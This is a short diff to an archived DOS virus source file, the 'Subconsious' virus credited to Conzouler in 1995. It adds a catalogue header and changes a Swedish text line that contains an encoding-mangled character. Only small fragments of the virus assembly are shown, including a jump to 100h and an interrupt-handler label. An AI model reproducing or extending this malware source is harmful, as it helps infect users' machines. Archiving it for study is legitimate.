@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;
 ;  Subconsious virus, written by Conzouler 1995.
 ;
@@ -92,7 +103,7 @@ nodebug:
         movsb
         retn                                    ; Jump to 100h
 
-        db      '  Mina tankar �r det sista som ni tar...  '
+        db      '  Mina tankar �r det sista som ni tar...  '
 
 vec08:
         pushf
